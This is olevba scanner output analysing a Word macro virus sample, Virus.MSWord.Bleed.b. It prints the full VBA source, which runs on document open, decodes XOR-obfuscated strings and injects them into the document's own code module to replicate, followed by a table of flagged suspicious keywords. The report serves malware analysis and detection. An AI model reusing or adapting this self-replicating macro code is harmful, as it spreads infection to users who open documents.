olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bleed.b-3ca1fdb27fa59f2ab2cc216fee1070468a966164
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bleed.b-3ca1fdb27fa59f2ab2cc216fee1070468a966164 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim jacky(15) As String
jacky(1) = "Řů·Ňĺĺřĺ·Ĺňäâúň·Ůňďă­·Äňă·ň·Ş·ÚöôĺřÔřůăöţůňĺ­·ă·Ş·¦"
jacky(2) = "ÄňăÖăăĺ·ŮřĺúöűĂňúçűöăňąŃâűűŮöúň»·áőŮřĺúöű"
jacky(3) = "Äňă·ŕ·Ş·ňąÁŐÇĺřýňôă­·ŘçăţřůäąÁţĺâäÇĺřăňôăţřů·Ş·żĹůó·˝·§ľ­·ŘçăţřůäąÄöáňŮřĺúöűÇĺřúçă·Ş·żĹůó·˝·§ľ"
jacky(4) = "Äňă·ű·Ş·ŕąÁŐÔřúçřůňůăäżăľ­·Äňă·đ·Ş·űąÔřóňÚřóâűň"
jacky(5) = "Äňă·ä·Ş·ŮřĺúöűĂňúçűöăň­·Äňă·ă˙·Ş·äąÁŐÇĺřýňôăąÁŐÔřúçřůňůăäżăľąÔřóňÚřóâűň"
jacky(6) = "ő·Ş·đąűţůňäżă»·Ąˇľ·±·áőÔĺ·±·đąűţůňäżŁ¤»·¦ľ"
jacky(7) = "Ţń·ň·Ş·ä·Ă˙ňů"
jacky(8) = "Äňă·ä·Ş·ÖôăţáňÓřôâúňůă­·Äňă·ă˙·Ş·äąÁŐÇĺřýňôăąÁŐÔřúçřůňůăäżăľąÔřóňÚřóâűň"
jacky(9) = "Ňůó·Ţń"
jacky(10) = "Ţń·ă˙ąűţůňäżă»·ăľ·Ş·§·Ă˙ňů"
jacky(11) = "ă˙ąÓŇűŇăňŰŢůňÄ·ă»·ă˙ąôŘâůăřńŰŢůŇä­·ă˙ąÖóóŃĺřúÄăĺţůđ·ő"
jacky(12) = "Ňůó·Ţń"
jacky(13) = "Ă˙ţäÓřôâúňůăąÁŐÇĺřýňôăąÁŐÔřúçřůňůăäżăľąÔřóňÚřóâűňąÓŇűŇăňŰŢůňÄ·Ą »·¦ˇ"
jacky(14) = "Ţń·ÓöîżŮřŕżľľ·Ş·żŢůăżĹůó·˝·¦˘ľľ·Ă˙ňů·ÚäđŐřď·µÔţöř·Äűöđň˙öúúňĺ¶·Ôřúň·äăöţ¨µ»·§»·µÔűöääąÄűöđň˙öúúňĺ·ë·ýöôü·ăŕřńűřŕňĺ·¸·ŰţůňÍňĺ§·¸·Úňăöç˙öäňµ"
jacky(15) = "ÖôăţáňÓřôâúňůăąÄöáňÖä·ÖôăţáňÓřôâúňůăąŃâűűŮöúň"
For y = 1 To 15: V = V & dc(jacky(y), 151) & vbCr: Next
If ThisDocument.VBProject.VBComponents(1).CodeModule.lines(28, 1) = "" Then ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 27, V
differ
End Sub
Private Function dc(a, e)
For i = 1 To Len(a): t = t & Chr(Asc(Mid(a, i, 1)) Xor e): Next i
dc = t
End Function
Private Sub differ()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

